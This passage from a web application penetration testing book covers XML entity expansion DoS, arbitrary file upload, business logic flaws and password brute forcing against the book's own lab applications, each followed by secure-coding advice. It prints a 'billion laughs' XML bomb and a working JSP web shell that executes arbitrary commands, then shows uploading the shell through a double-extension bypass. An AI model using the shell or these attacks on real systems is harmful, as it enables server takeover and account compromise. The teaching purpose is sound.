<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">

<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">

<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">

<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">

]>

<lolz>&lol9;</lolz>

This block of XML will have (109) or a billion lols, taking up almost 3 GB of memory. The lol entity takes up only 3 bytes of memory. This XML would be generally safe and will not cause a DoS if any of the entity expansion lines were removed. This is assuming the systems are not under a different attack, have a reasonable amount of memory and disk space, and the application was not coded in a way to make memory easily exhausted. For example, if two lines of this XML entity expansion were removed, then it would only take up 30 MB of memory.

In the case of XXE, finding a file resource that can be read or a network resource proves the DoS. It is not necessary to test for the DoS to prove it. The DoS is the simplest case. It can sometimes be hard to read files thoroughly. Depending on the size of the expected output, you might only get the first so many characters. For example, if the injection spot is supposed to only return 25 characters, then the first 25 characters of a file is all you will be able to read. You could end up with only an oracle that uses error message differences to tell if a file or local network resource exists. The DoS will work even if all you have proved is the oracle.

As XXE can cause DoS, it is not generally included in vulnerable applications. Open Worldwide Application Security Project (OWASP) has a project named OWASP-juice shop that does contain an example XXE for exploitation if set up locally. Instances of OWASP-juice-shop deployed in the cloud typically have the XXE disabled. Also, tryhackme has a free room with XXE and other web application vulnerabilities that you can try at: [https://tryhackme.com/room/owasptop10](https://tryhackme.com/room/owasptop10).

[Secure coding guidelines](#contents.xhtml_sc3_110a)

Vigilant configuration and mitigation efforts are crucial to secure XML parsing processes and prevent XXE exploits. Developers must implement secure parsing practices, turn off unnecessary features like XXE, and validate and sanitize XML input to mitigate these potentially devastating security risks.

To stop XXE, turn off entity inclusion on your XML parser unless needed. This will cause a fatal error if one is included. If you need entities, then turn off external entity expansion. These are generally Boolean settings for the parser. Please refer to [https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) for guidance on common JavaParsers and many others.

[Accidental denial of service](#contents.xhtml_sc2_111a)

Suppose you accidentally caused a service disruption or DoS during a penetration test. Taking immediate steps to mitigate the impact and address the situation responsibly is crucial. Here are some recommended actions:

1. Cease testing: Stop any ongoing penetration testing activities at once to prevent further impact on the target system.

2. Notify stakeholders: Inform relevant stakeholders, including the client or system owner, about the unintentional service disruption. Please provide details about what occurred and reassure them that steps are being taken to resolve the issue.

3. Document: Document the incident thoroughly, including the actions taken and the sequence of events that led to the service disruption. This documentation will be valuable for post-incident analysis and reporting.

4. Communicate with IT/DevOps teams: Reach out to the IT or DevOps teams responsible for maintaining the target system. Collaborate with them to understand the nature of the disruption and work together to restore regular service.

5. Revert changes: If configuration changes caused the disruption, revert them immediately to restore the system to its earlier state.

6. Make recommendations: Recommend mitigating the identified vulnerabilities or issues that led to the disruption. Work with the client to implement solutions that enhance the system's resilience against similar incidents.

7. Learn from the incident: Conduct a thorough analysis to understand the root cause and find lessons learned. This analysis will help improve future testing practices and prevent similar disruptions.

8. Review rules of engagement: Revisit and review the rules of engagement for the penetration test. Ensure that testing activities align with the agreed-upon scope and constraints. Adjust testing methodologies if needed to prevent unintended disruptions.

9. Apologize and clarify: Apologies to the client or system owner for any inconvenience caused by the disruption. Clarify that the incident was unintended and emphasize your commitment to resolving the issue promptly.

10. Adjust testing approach: Adjust your testing approach based on the incident and incorporate any necessary changes to prevent service disruptions while effectively finding vulnerabilities.

Remember, the primary goal of a penetration test is to improve the system's security, and any disruptions should be addressed responsibly and promptly to minimize impact and support a positive working relationship with the client.

[Conclusion](#contents.xhtml_sc2_112a)

Cyber security is rife with threats, and DoS attacks are formidable adversaries to digital systems. This chapter guided you through the DoS attack vectors, providing you with the skills to recognize and address these vulnerabilities. You understand when and how to test for DoS and the safest methods to conduct such tests. You also grasped the myriad sides of DoS attacks by exploring excessive input processing, concurrency issues, wild card searches, resource exhaustion, and memory consumption. Furthermore, we covered XXE, which can be a potent source of DoS. With the knowledge of XXE attack methods and code-secure solutions, you are better prepared to protect your digital environment from DoS attacks.

The next chapter will guide you in executing business logic vulnerabilities, shedding light on often-overlooked aspects of application security. You will explore how arbitrary file uploads can be exploited and learn safeguards to protect your digital environment. Sequential process flows will be examined, equipping you with a testing method to uncover vulnerabilities that may hide within your logic. Additionally, you will learn the significance of finding and testing business-specific rules to ensure your unique processes stay resilient to exploitation. Secure coding guidelines will provide the foundation to defend against these subtle yet significant threats.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 8Executing Business Logic Vulnerabilities](#contents.xhtml_ch08a)

[Introduction](#contents.xhtml_sc2_113a)

In cyber security, business logic forms the core of every application. The intricate web of rules and processes underpin the very essence of a system's functions. However, this complexity can also supply a fertile ground for malicious exploitation. In this chapter, we venture into executing business logic vulnerabilities, a profoundly overlooked but significant side. We will dissect the shared business logic vulnerabilities, ranging from the dangerous terrain of arbitrary file uploads to the intricacies of sequential process flows and the business-specific rules unique to your application. Through step-by-step testing examples and secure code guidelines, we aim to give you the knowledge and tools to recognize and address these vulnerabilities, fortifying your digital systems against their risks. This chapter is your gateway to understanding the subtle but profound threats lurking within your application's logic and ensuring your digital ventures' resilience and security.

[Structure](#contents.xhtml_sc2_114a)

This chapter will discuss the common types of business logic vulnerabilities, including:

*   Arbitrary file uploads
*   Sequential process flows
*   Business-specific rules vulnerabilities

There will be step-by-step testing examples for each vulnerability type, and secure code guidelines will also be discussed.

[Objectives](#contents.xhtml_sc2_115a)

By the end of this chapter, you will be familiar with business logic attack vectors. You will learn about arbitrary file uploads and how to exploit them. Safeguards for protecting the environment will follow. We will examine sequential process flows and testing methods. Finally, we learn how to find business-specific rules that need to be enforced and test those for vulnerabilities. Secure coding guidelines will also be covered.

[Arbitrary file uploads](#contents.xhtml_sc2_116a)

Arbitrary file upload vulnerabilities are a critical security risk within web applications, allowing attackers to maliciously upload and execute arbitrary files on a target server. This exploitation can lead to various malicious activities, such as unauthorized access, data theft, or even full server compromise. Attackers typically use insecure file upload functionalities, manipulating input fields to upload files with executable content, such as scripts or malware.

The file upload functionality can be exploited in several distinct ways:

*   An attacker might upload a .jsp file into the web tree, enabling the execution of JSP code within the context of the web user.
*   Exploiting flaws in image libraries and uploading a seemingly innocent .gif file for resizing can trigger a vulnerability, leading to the execution of malicious code.
*   By uploading huge files, attackers can engage in a file space denial-of-service attack, disrupting normal operations.
*   Uploading files with malicious paths or names could result in the overwrite of critical system files.
*   Uploading files having personal data may compromise the privacy of other users if proper access controls are lacking.
*   An attacker might upload executable files, and exploit them when included in a web page.
*   Additionally, uploading .exe files or virus-infected files could lead to victims unwittingly downloading trojaned executables or having their machines infected.
*   Lastly, uploading a .html file holding scripts can expose victims to Cross-Site Scripting (XSS) attacks, compromising the web application's security and potentially impacting users' browsing experiences.

Addressing these vulnerabilities requires stringent input validation, file type verification, and robust access controls during uploading.

[Exploitation](#contents.xhtml_sc3_117a)

When testing for arbitrary file uploads, a series of systematic tests will be conducted to evaluate the robustness of the file upload functionality. Follow the given steps:

1.  Begin by uploading an expected file type, using Burp Suite to capture the baseline HTTP request and parameters.
2.  Experiment by trying to upload a benign text file to ensure basic functionality.
3.  Subsequently, assess security measures in attempting to upload an HTML file designed to execute JavaScript.
4.  Then, try to upload a JSP file to test for Java execution capabilities.
5.  Assess the system's resilience in overwriting an existing file.
6.  Attempt uploading a file to a directory besides the default.

Throughout these tests, consider using double extensions, such as test.jpg.jsp or null character such as test.jsp%00.jpg,. These techniques can sometimes bypass basic filters and allow uploading files that might otherwise be restricted. Additionally, explore scenarios like serving a PHP file disguised as an image File.php.jpg as specific Apache configurations may automatically serve files as PHP.

An example  jsp shell to allow the attacker to run commands on the server would look like the following:

<%@ page import="java.util.*,java.io.*"%>

<HTML><BODY>

<FORM METHOD="GET" NAME="myform" ACTION="">

<INPUT TYPE="text" NAME="cmd">

<INPUT TYPE="submit" VALUE="Send">

</FORM>

<pre>

<%

if (request.getParameter("cmd") != null) {

out.println("Command: " + request.getParameter("cmd") + "<BR>");

Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));

OutputStream os = p.getOutputStream();

InputStream in = p.getInputStream();

DataInputStream dis = new DataInputStream(in);

String disr = dis.readLine();

while ( disr != null ) {

out.println(disr);

disr = dis.readLine();

}

}

%>

</pre>

</BODY></HTML>

This JSP shell takes any command as form input or a get parameter and executes it on the server. If this is Linux, the commands would be the same as using the Linux command line interface (CLI). For example, you would use ls, pwd, or whoami to gain basic information.

To run a command-line query on a Windows machine, additional information is needed. Each command must start with cmd.exe /C followed by the Windows command, such as dir.

This can also be handled in the JSP using an if statement before running the command, as shown as follows:

if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){

p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));

}

else{

p = Runtime.getRuntime().exec(request.getParameter("cmd"));

}

Next, let us walk through some testing. These tests help find and address vulnerabilities, ensuring the secure handling of file uploads in web applications.

First, upload to the amazing-myths-3 application. Use a user that you have previously created to log in. If you have not made a user or had to restart the application and clear the embedded database, register a user and log in now.

The first step of testing the file upload functionality should be to use the functionality as intended with Burp Suite, keeping a history to get baseline requests and responses. This step is part of the mapping process. If you have not previously created a post with an image file upload, complete this task now to get baseline requests and responses. The second step is to upload a benign text file. Below, we start by creating a new post and selecting a text file:

![](images/Figure_8.1.png)

Figure 8.1:  Select the text file to upload

Then, we click the Upload button, and the page refreshes to show the below, which includes a message that the file uploaded successfully:

![](images/Figure_8.2.png)

Figure 8.2: Text file uploaded

Under the Add New Post header is a broken image. Right-click the fractured image and select Open image in new tab from the menu below:

![](images/Figure_8.3.png)

Figure 8.3: View the uploaded file

Then, switch to the new tab to view the text file. Refer to the following figure:

![](images/Figure_8.4.png)

Figure 8.4: View text file

The text is displayed, and the file name is not changed. The next test is to try uploading HTML that has JavaScript to see if it functions and displays correctly. The file we will try to upload is noredirect.html and has the following HTML code:

<html>

<head>

<script "text/javascript">

window.onload=function() {

document.getElementById("docID").innerHTML = "I am from JavaScript";

alert('executing JavaScript');

</script>

</head>

<body>

<h1>You Have Been Hacked</h1>

really

<p id="docID"></p>

Yes

</body>

</html>

First, start the post creation and select this file as done previously with the benign text file:

![](images/Figure_8.5.png)

Figure 8.5: Upload HTML with JavaScript

After clicking Upload, the page refreshes, and we see the same message and a similar screen as the benign text file:

![](images/Figure_8.6.png)

Figure 8.6: HTML file uploaded

Similarly, we can see the HTML and JavaScript executing if we again click on the fractured image:

![](images/Figure_8.7.png)

Figure 8.7:  HTML and JavaScript executing

Now, try the last test: upload a jsp that will execute arbitrary commands via the post. This jsp will be the same jsp included as a sample jsp shell earlier in the chapter. This file is named test.jsp, as follows:

![](images/Figure_8.8.png)

Figure 8.8: Upload jsp shell

Clicking upload will show the same page and message as the previous two. Similarly, we right-click on the fractured image and open the new tab to display the jsp. Refer to the following figure:

![](images/Figure_8.9.png)

Figure 8.9: JSP Shell

Since this is a Windows machine, let us try using the dir command. Refer to the following figure:

![](images/Figure_8.10.png)

Figure 8.10: Run the Windows dir command on the JSP shell

Clicking send will refresh the page and show the results of the command. Refer to the following figure:

![](images/Figure_8.11.png)

Figure 8.11: JSP shell dir command output

We see that we are in the tomcat bin directory and can now try to look at and file or execute any CLI Windows command.

Now, try a slightly more complex application. Try to upload using our sample application habit-helper-1.0.

The file upload in habit-helper is obvious. It occurs when the user can upload a new post with an image. Use a user you created to log in, or create a new one and go to posts. Select write, then choose a benign text file to upload. Refer to the following figure:

![](images/Figure_8.12.png)

Figure 8.12: Uploading a text file

We see an error message saying that the file must be jpg, shown as follows:

![](images/Figure_8.13.png)

Figure 8.13: File must be a jpg

Given that a jpg extension appears to be wanted, we can search for a client-side protection mechanism to bypass, try a double extension, or try various file types. We hope this is something other than an allowlist of jpegs. Checking for client-side security is left as an exercise for the user.

Client-side protection seems unlikely since the error occurred when sending data to the server. Since we have the files ready, let us try our noredirect.html and test.jsp file.

When attempted to be uploaded, both files result in the same File must be a jpg error message shown in Figure 8.13. As there is no sign of client-side protection, we have a few options. The first is a simple double extension such as renaming test.jsp to be test.jpg.jsp. This would verify if the server is looking for the string .jpg in the filename. Another simple possibility would be to rename test.jsp to test.jpg without changing the file content. This would check if file signatures were verified as opposed to just extensions. Let us try the double extension, as follows:

![](images/Figure_8.14.png)

Figure 8.14: Try to upload a double file extension

If we click the Upload button, the page will refresh and show the following page:

![](images/Figure_8.15.png)

Figure 8.15: Double extension uploaded

As seen above, this upload found one of the CTF flags for the habit-helper-1.0 application. It also uploads the JSP. We can right-click on the fractured image to access the JSP shell. Then, run any Windows command line. Refer to the following figure:

![](images/Figure_8.16.png)

Figure 8.16: JSP shell on habit-helper

This example shows listing a file directory, but we could do many worse things. Uploading a simple JSP shell is dangerous, but it is not the final attack. Uploading viruses, ransomware, or msfvenom payloads to access Meterpreter would be possible. File uploads are the most dangerous functionality possible for any application.

[Secure coding guidelines](#contents.xhtml_sc3_118a)

Arbitrary file uploads can pose significant security risks if not handled with diligence. Securing arbitrary file uploads is paramount to safeguarding web applications against potential exploits and unauthorized access. Implementing robust, secure code guidelines ensures that file uploads are not avenues for malicious activities, preventing vulnerabilities that could compromise system integrity. Here are essential guidelines to fortify the security of file uploads and keep web applications resilient:

*   Allowlist allowed file extensions: Always keep an allowlist of allowed file extensions and verify their legitimacy by checking their extension and file signature. This helps prevent the upload of potentially malicious files.
*   Sanitize filenames: Remove control characters, including Unicode ones, from filenames and their extensions without exceptions. Limit filename lengths to prevent potential vulnerabilities, ensuring secure file naming conventions.
*   Algorithmic filenames: Consider using algorithms like MD5 hashes of file names plus date stamps as filenames. This adds an extra layer and makes it challenging for attackers to predict filenames.
*   Directory permissions: Ensure uploaded directories lack execute permissions, minimizing the risk of unauthorized code execution.
*   Size limitations: Implement maximum file size limitations to prevent denial-of-service attacks on file space and other application functions like image resizing. Additionally, restrict the number of files users can upload to mitigate the risk of DoS attacks with many small files.
*   Cross-Site Request Forgery  protection: Employ Cross-Site Request Forgery (CSRF) protection methods to guard against CSRF attacks during file uploads. This will be covered in more detail in [Chapter 11](#ch11.xhtml), Authorization Practices.
*   Overwrite prevention: Prevent file overwrites by considering file hashes. Avoid overwriting a file if it has the same hash as an existing one.
*   Virus scanning: Use server-side virus scanners to check uploaded files for malware. Free online virus scanners can be employed if confidentiality is not a concern. Store files initially with random names and without extensions. After virus checking, rename the files to their specific names and extensions. This adds an extra layer of security.
*   HTTP method selection: Use the POST method for file uploads instead of PUT or GET to enhance security.
*   Logging and security: Implement comprehensive logging of user activities, ensuring the mechanism is secure against forgery and code injection.
*   Compressed file handling: If the application supports compressed file extraction, scrutinize the contents individually to prevent security risks associated with compressed files.

By adhering to these secure code guidelines, developers can significantly reduce the risks associated with arbitrary file uploads, fortifying web applications against potential exploits, and ensuring the confidentiality and integrity of user-uploaded content. Diligent implementation of these measures is essential for creating a robust defense mechanism against file-based vulnerabilities.

[Sequential process flows](#contents.xhtml_sc2_119a)

While fundamental to the logical execution of business applications, sequential process flows can inadvertently introduce security vulnerabilities when not rigorously scrutinized. In web applications, sequential processes involve steps or operations that must be performed in a predefined order. Security risks arise when these processes lack adequate checks or validations at critical stages, potentially enabling attackers to manipulate the flow and exploit vulnerabilities. For instance, insufficient input validation or authorization checks between sequential steps may allow unauthorized users to access or use sensitive data.

[Testing methodology](#contents.xhtml_sc3_120a)

Testing for security vulnerabilities in sequential process flows is crucial to ensure the robustness of web applications. To effectively test sequential process flows, obtain a thorough history of the entire process using Burp Suite or similar tools.

Once the sequential steps are found, manually manipulate the execution order or selectively execute critical actions, such as altering a password or registering a user, using modified requests. This approach simulates real-world scenarios where attackers may try to subvert the intended flow of operations, helping uncover potential vulnerabilities and reinforcing the security posture of the application's sequential processes. [Chapter 9](#ch09.xhtml), Authentication Protocols, will walk through an example of the forgot password flow.

There is another sequential process flow in the Amazing Myths application, that is, the flow we use to create a post. So, let us test the flow of creating a post now on the amazing-myths-3 application.

Follow the steps given below:

1.  Continue creating a post by adding a title and description to our file upload as follows:

    ![](images/Figure_8.17.png)

    Figure 8.17: Finish Post

If we intercept this in Burp Suite, we can send the request to either the repeater or the intruder. Refer to the following figure:

![](images/Figure_8.18.png)

Figure 8.18: Repeating request through Burp Repeater

If we repeat the request twice and then refresh the post page, we see the post is listed three times. Writing posts does not enforce a sequential process flow. This is demonstrated in the following figure:

![](images/Figure_8.19.png)

Figure 8.19: Sequential flow for posts is not enforced

There are other interesting aspects to test in this request. We could specify any file we like as the image and insert it into the web page. We should try sensitive files on the server as well as remote URLs. We can change the username of the forum post author in the request. This allows us to be anonymous or forge a post as another user. We leave these tests as exercises for the user.

[Securing sequential process flows](#contents.xhtml_sc3_121a)

Finding and addressing these vulnerabilities requires meticulously examining each sequential step, ensuring proper controls are in place to safeguard against potential exploits and keep the integrity and security of the application's workflow. Securing the sequential process flow of web applications is paramount to prevent unauthorized deviations and support the integrity of intended operations.

Enforcing the intended flow is essential to fortify the security of sequential process flows. One practical approach involves saving state information in sessions and confirming that the user is at the expected point in the flow. Tools like Spring Web Flow or carefully crafted Spring MVC implementations can be employed to enforce the sequential progression of operations rigorously. By implementing these measures, developers ensure that users navigate the application in the intended sequence, mitigating the risk of unauthorized access or manipulation of critical processes.

Implementing secure code guidelines for sequential process flows is vital to uphold the structured progression of operations within web applications. By enforcing the intended flow through state management and using robust frameworks, developers can bolster the security of their applications, thwarting potential vulnerabilities associated with unauthorized deviations from the prescribed sequence.

[Business-specific rules vulnerabilities](#contents.xhtml_sc2_122a)

Inherent to the unique processes and rules governing an application, business-specific logic vulnerabilities pose a distinct set of security challenges. For example, an arbitrary modification of transaction amounts due to inadequate validation can lead to financial loss in systems that involve financial transactions. Similarly, in e-commerce platforms, the order fulfillment process flaws might allow attackers to manipulate order statuses, leading to unauthorized access to products or services. The following section will describe examples of finding and exploiting business-specific logic in the amazing myths applications. This section will conclude with secure coding and remediation advice.

[Business-specific rules example](#contents.xhtml_sc3_123a)

Business-specific logic vulnerabilities differ from previously discussed injection attacks, misconfiguration, or DoS vulnerabilities. They exploit the intricacies of an application's intended workflow and rules, often requiring a deep understanding of its logic. Unlike generic vulnerabilities, these weaknesses stem from deviations in how business processes are designed and executed, making them highly context-dependent and needing tailored testing methodologies for detection and mitigation.

Thus, Dynamic Application Security Testing (DAST) and Static Application Security Testing (SAST) tools primarily focus on finding common vulnerabilities at the code and runtime levels, such as injection flaws or insecure configurations, and rarely find these vulnerabilities. Business logic vulnerabilities often involve subtle deviations in the intended workflow. They are context-dependent, making it challenging for automated tools to detect without a deep understanding of the application's logic. DAST and SAST tools lack the contextual awareness needed to discern nuanced flaws in business processes, making manual penetration testing and thorough security reviews essential for finding and addressing such vulnerabilities.

Let us look at a business-specific rule that exists in the amazing-myths applications. In the Cross-site scripting section of [Chapter 4](#ch04.xhtml), Observability with SQL Injection, we saw exploiting the voting for your favorite myth via a DOM XSS. It also seems that each user was allowed to vote only once. We see the following message if we click the link to share with others after we vote:

![](images/Figure_8.20.png)

Figure 8.20: You have already voted error

If we can cast a second vote, we have bypassed a business logic rule. We can intercept the request for voting or search the history to find the HTTP request and response. We can right-click and send either of these to the repeater tool to experiment with. Refer to the following figure:

![](images/Figure_8.21.png)

Figure 8.21: Intercept vote request

The simplest possibility is to try to change the POST parameter username to a different string. The username cookie could also be involved, but the POST parameter provides the most straightforward test.

First, send the request to the repeater by right-clicking on the request and selecting the menu option Send to Repeater. The following figure shows using a repeater to try several usernames manually. First, we try using the same username.

![](images/Figure_8.22.png)

Figure 8.22: Repeat the request with the same username

This does not work. Only one vote per username is allowed. Next, let us try another valid user’s username. One username learned from the forum was JuliaHull. The following figure shows making this request with an alternate username:

![](images/Figure_8.23.png)

Figure 8.23: Voting using another user's username

This request works. Julia Hull has not previously voted, and we can use her vote. Lastly, let us try a nonexistent user’s username. Refer to the following figure:

![](images/Figure_8.24.png)

Figure 8.24: Using repeater to manually change usernames to a nonexistent user

This works as well. The logic requires a valid login to get to the page and any string as the username parameter to vote, although each username can vote only once. In this example, the username does not have to be valid; you may see examples in other applications that require knowing good usernames. Other similar possibilities involve encoding or changing cookies, localStorage, or sessionStorage. This example is an insecure direct object reference (IDOR) and a business logic vulnerability. IDORs will be covered in more detail in [Chapter 11](#ch11.xhtml), Authorization Practices.

This is just one example of business logic vulnerability.

[Business-specific rules remediation advice](#contents.xhtml_sc3_124a)

Finding and addressing such business-specific logic vulnerabilities requires a deep understanding of the application's intended workflow and meticulously examining the rules governing critical operations to ensure the system's robustness against potential exploits and unauthorized manipulations. These often occur because of skipped validation checks or using a denylist for validation. Remember, always confirm all user input to ensure it makes sense. In the above example, it does not make sense that a nonexistent user could vote. The validity check could have been improved by verifying a valid username, but it should have been the username of the same user who was logged in.

[User input validation secure coding guidance](#contents.xhtml_sc4_125a)

Effective input validation is critical for securing applications and preventing business logic vulnerabilities. Validation should encompass syntactic and semantic checks to ensure data integrity and adherence to expected criteria. Syntax validity provides that the data is in the expected form; for instance, validating that a four-digit account ID is precisely four digits long and consists only of numbers. On the other hand, semantic validity verifies that the data is within an acceptable range for the application's functionality and context, such as ensuring that a start date precedes the end date in a date range.

When implementing input validation, consider various factors like:

*   Data type: Confirm that the data type aligns with the expected format.
*   Allowed character set: Restrict input to an allowable character set.
*   Min/max length: Define permissible lengths to prevent overflows or truncation.
*   Null: Decide whether null values are acceptable.
*   Numeric range: Confirm numeric input within specified ranges.
*   Duplicates: Check for duplicate entries if applicable.
*   Parameter required: Confirm the presence of required parameters.
*   Legal value (Enum): Ensure input aligns with predefined legal values.
*   Specific pattern  (Regex): Employ regular expressions to enforce patterns.

This is a list of suggestions; your business needs will vary. By thoroughly considering these aspects during input validation, developers can fortify their applications against a wide range of potential vulnerabilities and enhance the overall security of business logic execution.

[Conclusion](#contents.xhtml_sc2_126a)

As the world of software development evolves, so do the threats that target the logic that drives our applications. This chapter has been your guide in executing business logic vulnerabilities, shedding light on the often-overlooked aspects of application security. You have explored arbitrary file uploads and how they can be exploited, with safeguards to protect your digital environment. We examined sequential process flows, equipping you with a testing method to uncover vulnerabilities that may hide within your logic. Moreover, you have learned the significance of finding and testing business-specific rules, ensuring your unique processes stay resilient to exploitation. Secure coding guidelines have supplied the foundation to defend against these subtle yet significant threats. As you continue your journey as a developer or security professional, remember that securing your business logic is as vital as safeguarding your code.

In the next chapter, you will learn about authentication attack vectors, testing methods, and secure coding guidelines to find and fortify against vulnerabilities related to login, logout, forgot password, and change password functionalities.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 9Authentication Protocols](#contents.xhtml_ch09a)

[Introduction](#contents.xhtml_sc2_127a)

Authentication protects user access to applications. Understanding authentication vulnerabilities is essential for strong cyber security. This chapter covers common authentication vulnerabilities, comprehensively exploring attack vectors that assail login mechanisms. From brute force attacks to intricacies in username enumeration, login, logout, and password-related vulnerabilities, this chapter will equip you with in-depth insights into potential threats and the defensive strategies needed to safeguard against them. Through step-by-step testing examples and secure coding guidelines, this chapter supplies a practical understanding of authentication protocols, ensuring you are well-prepared to defend against evolving cyber threats.

[Structure](#contents.xhtml_sc2_128a)

This chapter will discuss the common authentication vulnerabilities, including:

*   Brute force attacks
*   Username enumeration
*   Registration vulnerabilities
*   Login vulnerabilities
*   Logout vulnerabilities
*   Forgot password vulnerabilities
*   Change password vulnerabilities

Step-by-step testing examples for each vulnerability type and secure code guidelines will also be discussed.

[Objectives](#contents.xhtml_sc2_129a)

By the end of this chapter, you will be familiar with authentication attack vectors. You will learn about brute force attacks and how to perform and protect against them. We will examine username enumeration and testing methods. Finally, you will understand specific vulnerabilities for login, logout, forgotten password, and change password functionality. Secure coding guidelines will follow.

[Brute force attacks](#contents.xhtml_sc2_130a)

A brute force attack systematically tries all possible combinations of something, generally passwords or encryption keys, to gain unauthorized access to a system, exploiting and breaking security defenses via sheer computational power. This technique relies on persistence and automation to crack credentials through exhaustive trial and error. There are lots of versions of this attack. Anytime you keep guessing until you get in or get the desired result, you perform a brute-force attack.

A brute force attack could be used in any part of authentication. For example, a brute force attack could be used to find a username, a password, a username/password combination, a one-time passcode, a security question answer, or something else. The exploitation technique is similar no matter what you are guessing. In the next section, we will discuss the general testing technique and go through an example.

[Exploitation with brute force attacks](#contents.xhtml_sc3_131a)

This section will walk through a brute force attack to find the user Lizzie’s password in the habit-helper application. The first step to brute forcing is to get a copy of the request you want to use as a baseline. Then, identify what in the response indicates a correct or incorrect guess.

To guess a password, the baseline request would be a login request. Then, compare a login with the correct password to a login with the incorrect password so that you can figure out what in the response indicates a valid password.

This can be the HTTP response code, text in the HTTP response, or even the HTTP response size. The following are two screenshots for comparison. The first screenshot is the HTTP response when the password is correct.

![](images/Figure_9.1.png)

Figure 9.1: Correct password HTTP response

The following figure is the HTTP response with the incorrect password:

![](images/Figure_9.2.png)

Figure 9.2: Incorrect password HTTP response

Both responses are 302, but the incorrect password does not have the Set-Cookie headers, and the location header is distinct. We will use the location header value to set a flag on our enumeration.

The next step is deciding what list we will use to guess the password. There are many password lists out there that have various qualities. We could also use a source of information about our victim to create a personal list. We can use cewl, a tool included in Kali Linux, to create a custom wordlist from a website. This website does have an about us page with a bio of Lizzie, the founder. So, let us use cewl to create a custom wordlist for this brute force attack.

Refer to the following figure:

![](images/Figure_9.3.png)

Figure 9.3: cewl usage

Running cewl to extract the wordlist is shown below. The -d flag is the depth to spider the website. By specifying one, we tell the tool to only look at the specific page we sent. The -m flag is the minimum number of characters a word needs to be included in our list. This chooses four characters as the minimum. The -w flag shows a file name to save the list into. Finally, the URL for the tool to use for extraction is the last parameter. The tool stores each word on a separate line, as is standard for password enumeration files. Refer to the following figure:

![](images/Figure_9.4.png)

Figure 9.4: Running cewl

Now, we have a base request, a method for identifying correct and incorrect passwords, and a word list. We are ready to perform this attack. Start by sending the base request to the Burp Suite Intruder. This can be done by right-clicking on the request and selecting Send to Intruder from the options. Refer to the following figure:

![](images/Figure_9.5.png)

Figure 9.5: Send to Intruder

Then, select the Intruder tab. First, click the Clear button to remove all the automatic payload markers. Refer to the following figure:

![](images/Figure_9.6.png)

Figure 9.6: Intruder tab, clear payload markers

Next, scroll down to the username and password parameters. Ensure the username is Lizzie, highlight the password, and click Add. Refer to the following figure:

![](images/Figure_9.7.png)

Figure 9.7: Add payload marker for the password field

Then, select the payloads sub-tab of the Intruder tool, and under Payload Options,  click the Load button to load the file we created.

![](images/Figure_9.8.png)

Figure 9.8: Click the load button to select your password file

Now, select the sub-tab options to create our indicator flag. Scroll down to the Grep-Match section. First, add a checkmark to flag result items with response matching. Then, click the Clear button to remove the predefined options, as follows:

![](images/Figure_9.9.png)

Figure 9.9: Grep - Match set up

Then, add our text, which indicates an incorrect password. This was the error message: &message=Incorrect  username or password. If you forget your password, please use the forgot password link. Uncheck the Exclude HTTP headers, as the field we want to match is a header. Fully configured, this match will look like the following:

![](images/Figure_9.10.png)

Figure 9.10: Fully configured Grep-Match

We are now ready to click Start the attack. The attack will pop up in a different window. After it is finished, we can use the flag to sort results. Refer to the following figure:

![](images/Figure_9.11.png)

Figure 9.11: Intruder brute force attack results

The only 302 without the flag is the correct password for Lizzie, which we can see from above is cookies. A few of the results may have gotten 500 errors as well due to unexpected characters. We can exclude these via their status code.

[Secure coding guidelines](#contents.xhtml_sc3_132a)

Mitigating brute force attacks is crucial for preserving the security of authentication systems. Various methods exist to impede automated attacks and protect against unauthorized access:

*   Implementing challenges like CAPTCHAs or one-time passwords adds an extra layer of security by requiring users to prove they are human or have a unique, time-sensitive code. While effective, these measures can affect usability and potentially frustrate users.
*   Account lockouts involve temporarily or permanently deactivating an account after a specified number of failed login attempts. However, this approach introduces the risk of DoS attacks, where malicious actors deliberately try to lock out legitimate users by triggering multiple unsuccessful login attempts.
*   Throttling or rate limiting involves controlling the frequency of login tries from a specific source. This method allows several login attempts within a defined time frame, preventing rapid-fire attacks. Throttling balances security and usability, offering adequate protection without excessively inconveniencing users.

Throttling is often considered the most balanced and practical approach among these methods. While CAPTCHAs and one-time passwords enhance security, they can introduce usability challenges and user annoyance. On the other hand, account lockouts, while effective, carry the risk of unintentional denial of service. Throttling supplies a measured defense against brute force attacks, offering protection without significantly disrupting user experience. Ultimately, the choice of the best method depends on the specific security requirements and user expectations of the application.

[Username enumeration](#contents.xhtml_sc2_133a)

Username enumeration is a process by which attackers systematically extract valid usernames from an authentication system, often exploiting subtle differences in system responses to distinguish between existing and non-existent usernames. This technique supplies a foundation for later targeted attacks, enabling adversaries to compile a list of valid user accounts for exploitation or unauthorized access attempts. Understanding and mitigating username enumeration is crucial for bolstering the security of authentication processes.

Username enumeration is often done with automation as a brute-force attack to gather as many usernames as possible. It can occur on any part of the authentication system; login, forgotten password, and registration are the most common.

[Genuine risks posed by user enumeration](#contents.xhtml_sc3_134a)

Often, there is some pushback when presenting a user enumeration vulnerability to a client. Non-security folks like developers and business teams often believe these are not real vulnerabilities. User enumeration is a real risk when login is completed by knowing a username and a password. People are creatures of habit, and we tend to use the same easy-to-remember passwords. Most people choose simple dictionary words. When password complexity requirements are enforced, such as using lowercase, uppercase, numbers, and special characters, most people will capitalize the first letter of their password, add a number to the beginning or end, and ten percent of people finish their password with “!” mark when required to have a special character.

